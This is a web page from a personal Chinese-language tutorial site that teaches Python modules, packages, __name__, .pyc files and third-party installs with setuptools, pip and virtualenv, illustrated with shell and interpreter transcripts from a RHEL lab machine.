<!DOCTYPE html>
<html lang="en">
<head prefix="og: http://ogp.me/ns#">
  <meta charset="utf-8">
  <title>Python 模块 | BoobooWei</title>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Canonical links -->
  <link rel="canonical" href="http://www.toberoot.com/linux/6_devops/booboo_python/04-python">
  <!-- Alternate links -->
  
    
      
    
    <link rel="alternate" hreflang="x-default" href="http://www.toberoot.com/linux/6_devops/booboo_python/04-python" />
  
  <!-- Icon -->
  <link rel="apple-touch-icon" sizes="57x57" href="../../../icon/apple-touch-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="114x114" href="../../../icon/apple-touch-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="72x72" href="../../../icon/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="144x144" href="../../../icon/apple-touch-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="60x60" href="../../../icon/apple-touch-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="120x120" href="../../../icon/apple-touch-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="76x76" href="../../../icon/apple-touch-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="152x152" href="../../../icon/apple-touch-icon-152x152.png">
  <link rel="icon" type="image/png" href="../../../icon/favicon-196x196.png" sizes="196x196">
  <link rel="icon" type="image/png" href="../../../icon/favicon-160x160.png" sizes="160x160">
  <link rel="icon" type="image/png" href="../../../icon/favicon-96x96.png" sizes="96x96">
  <link rel="icon" type="image/png" href="../../../icon/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="../../../icon/favicon-32x32.png" sizes="32x32">
  <meta name="msapplication-TileColor" content="#2f83cd">
  <meta name="msapplication-TileImage" content="../../../icon/mstile-144x144.png">
  <!-- CSS -->
  <!-- build:css build/css/navy.css -->
  
<link rel="stylesheet" href="../../../css/navy.css">

  <!-- endbuild -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-lato@0.0.75/index.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.3.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/docsearch.js/1/docsearch.min.css">
  <!-- RSS -->
  <link rel="alternate" href="../../../atom.xml" title="BoobooWei" type="application/atom+xml">
  <!-- Open Graph -->
  <meta name="description" content="[TOC] 模块Module预先写好的代码，供其他代码使用。 一个module是一个独立文件。 每个module拥有自己的全局变量空间。数据定义，函数，均定义在其中。 %%writefile testmod.pyvarible1 &#x3D; 1varible2 &#x3D; 2def add(a, b):    return a+bif __name__ &#x3D;&#x3D; &#x27;__main__&#x27;:    pr">
<meta property="og:type" content="website">
<meta property="og:title" content="Python 模块">
<meta property="og:url" content="http://www.toberoot.com/linux/6_devops/booboo_python/04-python">
<meta property="og:site_name" content="BoobooWei">
<meta property="og:description" content="[TOC] 模块Module预先写好的代码，供其他代码使用。 一个module是一个独立文件。 每个module拥有自己的全局变量空间。数据定义，函数，均定义在其中。 %%writefile testmod.pyvarible1 &#x3D; 1varible2 &#x3D; 2def add(a, b):    return a+bif __name__ &#x3D;&#x3D; &#x27;__main__&#x27;:    pr">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://www.toberoot.com/icon/og-image-wide.png">
<meta property="article:published_time" content="2025-10-22T08:53:56.052Z">
<meta property="article:modified_time" content="2025-10-22T08:49:27.916Z">
<meta property="article:author" content="魏亚萍">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.toberoot.com/icon/twitter-summary.png">
<meta property="fb:admins" content="100000247608790">
  <!-- Google Analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-48498357-3', 'auto');
  ga('send', 'pageview');
</script>

  <!-- Algolia -->
  <link rel="preconnect" href="https://-dsn.algolia.net" crossorigin />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css@3">
<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <header id="header" class="wrapper">
  <div id="header-inner" class="inner">
    <h1 id="logo-wrap">
      <a href="../../../" id="logo">Hexo</a>
    </h1>
    <nav id="main-nav">
      <a href="../../../docs/" class="main-nav-link">Hexo</a><a href="../../../news/" class="main-nav-link">News</a><a href="../../../api/" class="main-nav-link">MySQL8.0</a><a href="../../../database/" class="main-nav-link">Database</a><a href="../../../linux/" class="main-nav-link">Linux</a><a href="../../../cloud/" class="main-nav-link">Cloud</a><a href="../../../singapore/" class="main-nav-link">Singapore</a><a href="../../../amy/" class="main-nav-link">AMY</a><a href="../../../about/" class="main-nav-link">About</a>
      <a target="_blank" rel="noopener" href="https://github.com/BoobooWei" class="main-nav-link"><i class="fa fa-github-alt"></i></a>

      <div id="search-input-wrap">
        <div id="search-input-icon">
          <i class="fa fa-search"></i>
        </div>
        <input type="search" id="search-input" placeholder="Search...">
      </div>
    </nav>
    <div id="lang-select-wrap">
        <a href="/about/" class="main-nav-link"><label id="lang-select-label"><i class="fa fa-globe"></i><span>关于我</span></label></a>
    </div>
    <a id="mobile-nav-toggle">
      <span class="mobile-nav-toggle-bar"></span>
      <span class="mobile-nav-toggle-bar"></span>
      <span class="mobile-nav-toggle-bar"></span>
    </a>
  </div>
</header>

    <div id="content-wrap">
  <div id="content" class="wrapper">
    <div id="content-inner">
      <article class="article-container" itemscope itemtype="http://schema.org/Article">
        <div class="article-inner">
          <div class="article">
            <div class="inner">
              <header class="article-header">
                <h1 class="article-title" itemprop="name">Python 模块</h1>
                <a target="_blank" rel="noopener" href="https://github.com/BoobooWei/site/edit/master/source/linux/6_devops/booboo_python/04-python.md" class="article-edit-link" title="Improve this doc"><i class="fa fa-pencil"></i></a>
              </header>
              <div class="article-content" itemprop="articleBody">
                <html><head></head><body><p>[TOC]</p>
<h2 id="模块" class="article-heading"><a href="#模块" class="headerlink" title="模块"></a>模块<a class="article-anchor" href="#模块" aria-hidden="true"></a></h2><h3 id="Module" class="article-heading"><a href="#Module" class="headerlink" title="Module"></a>Module<a class="article-anchor" href="#Module" aria-hidden="true"></a></h3><p>预先写好的代码，供其他代码使用。</p>
<p>一个module是一个独立文件。</p>
<p>每个module拥有自己的全局变量空间。数据定义，函数，均定义在其中。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">%%writefile testmod.py</span><br><span class="line">varible1 = <span class="number">1</span></span><br><span class="line">varible2 = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'run as script'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>Writing testmod.py</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">!ls -l testmod.py</span><br></pre></td></tr></tbody></table></figure>

<p>-rw-r–r– 1 shell shell 111 9月 6 13:03 testmod.py</p>
<h3 id="import" class="article-heading"><a href="#import" class="headerlink" title="import"></a>import<a class="article-anchor" href="#import" aria-hidden="true"></a></h3><p>import引入某个module对象，可使用module.name的方式引用它的全局变量。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> testmod</span><br><span class="line">testmod.varible1</span><br></pre></td></tr></tbody></table></figure>

<p>1</p>
<h3 id="from-import" class="article-heading"><a href="#from-import" class="headerlink" title="from import"></a>from import<a class="article-anchor" href="#from-import" aria-hidden="true"></a></h3><p>from import引入模块中的某个（或全部）变量。</p>
<p>被引入变量不需要module.name来访问，仅需要name。</p>
<p>注意：不推荐引入全部变量，会引起名称空间污染。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> testmod <span class="keyword">import</span> varible2</span><br><span class="line">varible2</span><br></pre></td></tr></tbody></table></figure>

<p>2</p>
<h3 id="dir" class="article-heading"><a href="#dir" class="headerlink" title="dir"></a>dir<a class="article-anchor" href="#dir" aria-hidden="true"></a></h3><p>列出某个模块的所有变量。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> testmod</span><br><span class="line"><span class="built_in">dir</span>(testmod)</span><br></pre></td></tr></tbody></table></figure>

<p>[‘<strong>builtins</strong>‘,<br>‘<strong>doc</strong>‘,<br>‘<strong>file</strong>‘,<br>‘<strong>name</strong>‘,<br>‘<strong>package</strong>‘,<br>‘add’,<br>‘varible1’,<br>‘varible2’]</p>
<h3 id="模块预编译" class="article-heading"><a href="#模块预编译" class="headerlink" title="模块预编译"></a>模块预编译<a class="article-anchor" href="#模块预编译" aria-hidden="true"></a></h3><p>当import时，python会试图去编译出pyc文件来。</p>
<p>pyc是被编译过的py文件，加载pyc文件可以跳过语法解析过程。</p>
<p>当py日期新于pyc时，重新生成pyc。所以日期紊乱可能导致执行老代码。</p>
<p>在Python3(3.2以后)中，会在当前目录下生成<strong>pycache</strong>目录，来缓存pyc文件。</p>
<p>这样可以避免多个Python解释器无法互相载入对方的pyc文件。</p>
<p>具体可以参考这里： <a target="_blank" rel="noopener" href="https://docs.python.org/3/whatsnew/3.2.html">https://docs.python.org/3/whatsnew/3.2.html</a></p>
<h3 id="name属性" class="article-heading"><a href="#name属性" class="headerlink" title="name属性"></a><strong>name</strong>属性<a class="article-anchor" href="#name属性" aria-hidden="true"></a></h3><p>模块有一个属性，<strong>name</strong>。当这个属性为’<strong>main</strong>‘时，说明当前模块被作为脚本运行。</p>
<p>模块被作为以脚本运行时，不生成pyc文件（因为不是import）。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 ~]# vim /root/pythondir/a.py</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env python</span></span><br><span class="line">def max(x,y):</span><br><span class="line">        if x&gt;y:return x</span><br><span class="line">        else:return y</span><br><span class="line">if __name__=="__main__":</span><br><span class="line">        print max(2,1)</span><br><span class="line">[root@workstation0 ~]# python a.py</span><br><span class="line">2</span><br><span class="line">[root@workstation0 ~]# ls</span><br><span class="line">a.py</span><br><span class="line">[root@workstation0 ~]# python</span><br><span class="line">Python 2.7.5 (default, Oct 11 2015, 17:47:16)</span><br><span class="line">[GCC 4.8.3 20140911 (Red Hat 4.8.3-9)] on linux2</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import a</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">dir</span>(a)</span></span><br><span class="line">['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'max']</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a.max</span></span><br><span class="line">&lt;function max at 0x7f8518edd938&gt;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a.max(3,4)</span></span><br><span class="line">4</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; a.max(5,2)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">exit</span>()</span></span><br><span class="line">[root@workstation0 ~]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-rw-r-- 1 root root 111 Nov 17 12:09 a.py</span><br><span class="line">-rw-rw-r-- 1 root root 290 Nov 17 12:11 a.py</span><br><span class="line"></span><br><span class="line">[root@workstation0 ~]# vim b.py</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env python</span></span><br><span class="line">def min(x,y):</span><br><span class="line">	if x&lt;y:return x</span><br><span class="line">	else: return y</span><br><span class="line">if __name__=="__main__":</span><br><span class="line">	print min(3,1)</span><br><span class="line">[root@rhel6 ~] python b.py</span><br><span class="line">1</span><br><span class="line">[root@workstation0 ~]# ll</span><br><span class="line">total 12</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 111 Nov 17 12:09 a.py</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 290 Nov 17 12:11 a.pyc</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 110 Nov 17 12:17 b.py</span><br><span class="line">[root@workstation0 ~]# python</span><br><span class="line">Python 2.7.5 (default, Oct 11 2015, 17:47:16)</span><br><span class="line">[GCC 4.8.3 20140911 (Red Hat 4.8.3-9)] on linux2</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import b</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">dir</span>(b)</span></span><br><span class="line">['__builtins__', '__doc__', '__file__', '__name__', '__package__', 'min']</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; b.min(4,1)</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">exit</span>()</span></span><br><span class="line">[root@workstation0 ~]# ll</span><br><span class="line">total 16</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 111 Nov 17 12:09 a.py</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 290 Nov 17 12:11 a.pyc</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 110 Nov 17 12:17 b.py</span><br><span class="line">-rw-rw-r-- 1 kiosk kiosk 290 Nov 17 12:17 b.pyc</span><br></pre></td></tr></tbody></table></figure>

<h3 id="package" class="article-heading"><a href="#package" class="headerlink" title="package"></a>package<a class="article-anchor" href="#package" aria-hidden="true"></a></h3><p>到目前为止,你一定已经开始看到了组织你的程序的层次。变量通常在函数内部<br>运行。函数和全局变量通常在模块内部运行。如果你想自己组织模块呢?那” 包” 就<br>会进入到你的视野中。</p>
<p>包是模块的文件夹,有一个特殊的 <strong>init</strong>.py 文件,用来表明这个文件夹是特殊<br>的因为其包含有 Python 模块。</p>
<p>加入你想创建一个叫做’world’ 的包,有子包’asia’,’africa’ 等等,并且,这些子包<br>又包含模块,如’india’,’madagascar’ 等等。</p>
<ul>
<li>从组织结构上说，package是比modules更大一级的结构。</li>
<li>一个package里可以包含多个modules和packages。</li>
</ul>
<blockquote>
<p>课堂练习：创建一个pythondir包，其中包含了模块a和模块b</p>
</blockquote>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 ~]# <span class="built_in">touch</span> /root/pythondir/__init__.py</span><br><span class="line">[root@workstation0 ~]# ipython</span><br><span class="line">In [2]: import sys</span><br><span class="line"></span><br><span class="line">In [3]: <span class="built_in">print</span> sys.path</span><br><span class="line">[<span class="string">''</span>, <span class="string">'/usr/bin'</span>, <span class="string">'/usr/lib64/python27.zip'</span>, <span class="string">'/usr/lib64/python2.7'</span>, <span class="string">'/usr/lib64/python2.7/plat-linux2'</span>, <span class="string">'/usr/lib64/python2.7/lib-tk'</span>, <span class="string">'/usr/lib64/python2.7/lib-old'</span>, <span class="string">'/usr/lib64/python2.7/lib-dynload'</span>, <span class="string">'/usr/lib64/python2.7/site-packages'</span>, <span class="string">'/usr/lib64/python2.7/site-packages/gtk-2.0'</span>, <span class="string">'/usr/lib/python2.7/site-packages'</span>, <span class="string">'/usr/lib/python2.7/site-packages/IPython/extensions'</span>]</span><br><span class="line"></span><br><span class="line">[root@workstation0 ~]# ipython</span><br><span class="line">Python 2.7.5 (default, Oct 11 2015, 17:47:16)</span><br><span class="line">Type <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">IPython 0.13.1 -- An enhanced Interactive Python.</span><br><span class="line">?         -&gt; Introduction and overview of IPython<span class="string">'s features.</span></span><br><span class="line"><span class="string">%quickref -&gt; Quick reference.</span></span><br><span class="line"><span class="string">help      -&gt; Python'</span>s own <span class="built_in">help</span> system.</span><br><span class="line">object?   -&gt; Details about <span class="string">'object'</span>, use <span class="string">'object??'</span> <span class="keyword">for</span> extra details.</span><br><span class="line"></span><br><span class="line">In [1]: import pythondir.a</span><br><span class="line"></span><br><span class="line">In [2]: pythondir.a.max(1,2)</span><br><span class="line">Out[2]: 2</span><br><span class="line"></span><br><span class="line">In [3]: import pythondir.b</span><br><span class="line"></span><br><span class="line">In [4]: pythondir.b.min(1,2)</span><br><span class="line">Out[4]: 1</span><br></pre></td></tr></tbody></table></figure>

<h3 id="练习" class="article-heading"><a href="#练习" class="headerlink" title="练习"></a>练习<a class="article-anchor" href="#练习" aria-hidden="true"></a></h3><ul>
<li>导入系统sys模块</li>
<li>列出sys模块中以s开头并且以e结尾的成员。</li>
</ul>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 ~]# cat m2.py</span><br><span class="line">import sys</span><br><span class="line">for i in dir(sys):</span><br><span class="line">	if i.startswith('s') and i.endswith('e'):</span><br><span class="line">		print(i)</span><br><span class="line"></span><br><span class="line">[root@workstation0 ~]# python m2.py</span><br><span class="line">setprofile</span><br><span class="line">settrace</span><br></pre></td></tr></tbody></table></figure>

<h2 id="第三方软件安装" class="article-heading"><a href="#第三方软件安装" class="headerlink" title="第三方软件安装"></a>第三方软件安装<a class="article-anchor" href="#第三方软件安装" aria-hidden="true"></a></h2><p>两套基本系统：</p>
<pre><code>setuptools
pip
</code></pre>
<p>booboo:根据不同的需求，我们可能需要安装不同的第三方软件包（python模块）</p>
<h3 id="setuptools" class="article-heading"><a href="#setuptools" class="headerlink" title="setuptools"></a>setuptools<a class="article-anchor" href="#setuptools" aria-hidden="true"></a></h3><p>系统中必须安装了setuptools</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 tmp]# yum list|grep setuptools</span><br><span class="line">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class="line">python-setuptools.noarch                0.9.8-4.el7                @anaconda/7.2</span><br><span class="line">[root@workstation0 tmp]# rpm -q python-setuptools</span><br><span class="line">python-setuptools-0.9.8-4.el7.noarch</span><br><span class="line">[root@workstation0 tmp]# rpm -qi python-setuptools</span><br><span class="line">Name        : python-setuptools</span><br><span class="line">Version     : 0.9.8</span><br><span class="line">Release     : 4.el7</span><br><span class="line">Architecture: noarch</span><br><span class="line">Install Date: Wed 04 May 2016 02:39:11 AM CST</span><br><span class="line">Group       : Applications/System</span><br><span class="line">Size        : 2041356</span><br><span class="line">License     : Python or ZPLv2.0</span><br><span class="line">Signature   : RSA/SHA256, Fri 07 Aug 2015 02:30:06 PM CST, Key ID 199e2f91fd431d51</span><br><span class="line">Source RPM  : python-setuptools-0.9.8-4.el7.src.rpm</span><br><span class="line">Build Date  : Tue 30 Jun 2015 06:44:38 PM CST</span><br><span class="line">Build Host  : x86-024.build.eng.bos.redhat.com</span><br><span class="line">Relocations : (not relocatable)</span><br><span class="line">Packager    : Red Hat, Inc. &lt;http://bugzilla.redhat.com/bugzilla&gt;</span><br><span class="line">Vendor      : Red Hat, Inc.</span><br><span class="line">URL         : http://pypi.python.org/pypi/setuptools</span><br><span class="line">Summary     : Easily build and distribute Python packages</span><br><span class="line">Description :</span><br><span class="line">Setuptools is a collection of enhancements to the Python distutils that allow</span><br><span class="line">you to more easily build and distribute Python packages, especially ones that</span><br><span class="line">have dependencies on other packages.</span><br><span class="line"></span><br><span class="line">This package contains the runtime components of setuptools, necessary to</span><br><span class="line">execute the software that requires pkg_resources.py.</span><br><span class="line"></span><br><span class="line">This package contains the distribute fork of setuptools.</span><br><span class="line"></span><br><span class="line">[root@workstation0 tmp]# rpm -ql python-setuptools</span><br><span class="line">/usr/bin/easy_install</span><br><span class="line">/usr/bin/easy_install-2.7</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">/usr/share/doc/python-setuptools-0.9.8/docs/python3.txt</span><br><span class="line">/usr/share/doc/python-setuptools-0.9.8/docs/roadmap.txt</span><br><span class="line">/usr/share/doc/python-setuptools-0.9.8/docs/setuptools.txt</span><br><span class="line">/usr/share/doc/python-setuptools-0.9.8/docs/using.txt</span><br><span class="line">/usr/share/doc/python-setuptools-0.9.8/psfl.txt</span><br><span class="line">/usr/share/doc/python-setuptools-0.9.8/zpl.txt</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h4 id="setuptools的使用" class="article-heading"><a href="#setuptools的使用" class="headerlink" title="setuptools的使用"></a>setuptools的使用<a class="article-anchor" href="#setuptools的使用" aria-hidden="true"></a></h4><pre><code>easy_install 包名
easy_install 安装包路径。（路径可以填写一个url，系统会从网络上下载安装）
在软件的分发包中找到setup.py，直接运行python setup.py install
</code></pre>
<p>进一步资料请参考：<a target="_blank" rel="noopener" href="https://setuptools.readthedocs.io/en/latest/easy_install.html">https://setuptools.readthedocs.io/en/latest/easy_install.html</a></p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 tmp]# easy_install --help</span><br><span class="line">...</span><br><span class="line">usage: easy_install [options] requirement_or_url ...</span><br><span class="line">   or: easy_install --help</span><br></pre></td></tr></tbody></table></figure>

<h3 id="pip" class="article-heading"><a href="#pip" class="headerlink" title="pip"></a>pip<a class="article-anchor" href="#pip" aria-hidden="true"></a></h3><p>系统中必须有pip，具体请咨询管理员。或者下载该文件：</p>
<p><a target="_blank" rel="noopener" href="https://bootstrap.pypa.io/get-pip.py">https://bootstrap.pypa.io/get-pip.py</a></p>
<p>使用python执行安装（注意需要管理员权限）。</p>
<h4 id="pip的使用" class="article-heading"><a href="#pip的使用" class="headerlink" title="pip的使用"></a>pip的使用<a class="article-anchor" href="#pip的使用" aria-hidden="true"></a></h4><pre><code>pip install 包名
pip install -r requirements.txt （自动处理里面的所有依赖）
</code></pre>
<h3 id="virtualenv" class="article-heading"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv<a class="article-anchor" href="#virtualenv" aria-hidden="true"></a></h3><p>功能：用于隔离出一套独立的环境，可以在里面安装各种包，而不对系统造成影响。</p>
<p>使用场景：可以在用户目录中安装包，无需系统权限。也可以隔离多个环境，安装不同版本的不同程序。</p>
<p>限制：virtualenv本身，及其依赖的Python是无法隔离的。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 tmp]# yum list|grep virtualenv</span><br><span class="line">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class="line">python-virtualenv.noarch                1.10.1-2.el7               rhel_dvd</span><br><span class="line">[root@workstation0 tmp]# rpm -q python-virtualenv</span><br><span class="line">package python-virtualenv is not installed</span><br><span class="line">[root@workstation0 tmp]# rpm -q python-virtualenv</span><br><span class="line">package python-virtualenv is not installed</span><br><span class="line">[root@workstation0 tmp]# yum install -y python-virtualenv</span><br><span class="line">Loaded plugins: langpacks, product-id, search-disabled-repos,</span><br><span class="line">              : subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.</span><br><span class="line">Repodata is over 2 weeks old. Install yum-cron? Or run: yum makecache fast</span><br><span class="line">rhel_dvd                                     | 4.1 kB     00:00</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-virtualenv.noarch 0:1.10.1-2.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Processing Dependency: python2-devel <span class="keyword">for</span> package: python-virtualenv-1.10.1-2.el7.noarch</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package python-devel.x86_64 0:2.7.5-34.el7 will be installed</span></span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span></span><br><span class="line"></span><br><span class="line">Dependencies Resolved</span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line"> Package              Arch      Version           Repository   Size</span><br><span class="line">====================================================================</span><br><span class="line">Installing:</span><br><span class="line"> python-virtualenv    noarch    1.10.1-2.el7      rhel_dvd    1.2 M</span><br><span class="line">Installing for dependencies:</span><br><span class="line"> python-devel         x86_64    2.7.5-34.el7      rhel_dvd    391 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">====================================================================</span><br><span class="line">Install  1 Package (+1 Dependent package)</span><br><span class="line"></span><br><span class="line">Total download size: 1.6 M</span><br><span class="line">Installed size: 2.6 M</span><br><span class="line">Downloading packages:</span><br><span class="line">(1/2): python-devel-2.7.5-34.el7.x86_64.rpm    | 391 kB   00:00</span><br><span class="line">(2/2): python-virtualenv-1.10.1-2.el7.noarch.r | 1.2 MB   00:00</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">Total                                  8.9 MB/s | 1.6 MB  00:00</span><br><span class="line">Running transaction check</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded</span><br><span class="line">Running transaction</span><br><span class="line">  Installing : python-devel-2.7.5-34.el7.x86_64                 1/2</span><br><span class="line">  Installing : python-virtualenv-1.10.1-2.el7.noarch            2/2</span><br><span class="line">  Verifying  : python-devel-2.7.5-34.el7.x86_64                 1/2</span><br><span class="line">  Verifying  : python-virtualenv-1.10.1-2.el7.noarch            2/2</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  python-virtualenv.noarch 0:1.10.1-2.el7</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  python-devel.x86_64 0:2.7.5-34.el7</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[root@workstation0 tmp]# rpm -ql python-virtualenv</span><br><span class="line">/usr/bin/virtualenv</span><br><span class="line">/usr/bin/virtualenv-2.7</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv-1.10.1-py2.7.egg-info</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv.py</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv.pyc</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv.pyo</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv_support</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv_support/__init__.py</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv_support/__init__.pyc</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv_support/__init__.pyo</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv_support/pip-1.4.1.tar.gz</span><br><span class="line">/usr/lib/python2.7/site-packages/virtualenv_support/setuptools-0.9.8.tar.gz</span><br><span class="line">/usr/share/doc/python-virtualenv-1.10.1</span><br><span class="line">/usr/share/doc/python-virtualenv-1.10.1/AUTHORS.txt</span><br><span class="line">/usr/share/doc/python-virtualenv-1.10.1/LICENSE.txt</span><br><span class="line">/usr/share/doc/python-virtualenv-1.10.1/PKG-INFO</span><br><span class="line">/usr/share/doc/python-virtualenv-1.10.1/index.rst</span><br><span class="line">/usr/share/doc/python-virtualenv-1.10.1/news.rst</span><br><span class="line"></span><br><span class="line">[root@workstation0 tmp]# virtualenv --help</span><br><span class="line">Usage: virtualenv [OPTIONS] DEST_DIR</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h4 id="virtualenv的使用" class="article-heading"><a href="#virtualenv的使用" class="headerlink" title="virtualenv的使用"></a>virtualenv的使用<a class="article-anchor" href="#virtualenv的使用" aria-hidden="true"></a></h4><p>建立环境：virtualenv 目录名</p>
<p>激活环境：进入目录后执行source bin/activate</p>
<p>退出激活环境：deactivate</p>
<p>隔离环境内的安装：pip或者setup.py均可</p>
<p>注意：安装库时需要编译的，系统中必须有编译工具链。</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">[root@workstation0 ~]# mkdir booboo</span><br><span class="line">[root@workstation0 ~]# virtualenv booboo</span><br><span class="line">New python executable in booboo/bin/python</span><br><span class="line">Installing Setuptools..............................................................................................................................................................................................................................done.</span><br><span class="line">Installing Pip.....................................................................................................................................................................................................................................................................................................................................done.</span><br><span class="line">[root@workstation0 ~]# source bin/activate</span><br><span class="line">-bash: bin/activate: No such file or directory</span><br><span class="line">[root@workstation0 ~]# find / -name "activate"</span><br><span class="line">/root/booboo/bin/activate</span><br><span class="line">[root@workstation0 ~]# source /root/booboo/bin/activate</span><br><span class="line">(booboo)[root@workstation0 ~]#</span><br><span class="line">(booboo)[root@workstation0 ~]# ll booboo</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 2 root root 4096 Oct 17 15:45 bin</span><br><span class="line">drwxr-xr-x. 2 root root   22 Oct 17 15:45 include</span><br><span class="line">drwxr-xr-x. 3 root root   22 Oct 17 15:45 lib</span><br><span class="line">lrwxrwxrwx. 1 root root    3 Oct 17 15:45 lib64 -&gt; lib</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<h4 id="访问系统库" class="article-heading"><a href="#访问系统库" class="headerlink" title="访问系统库"></a>访问系统库<a class="article-anchor" href="#访问系统库" aria-hidden="true"></a></h4><p>如果在使用virtualenv的同时，也想使用系统中安装的库。那么需要在创建环境时用–system-site-packages参数。</p>
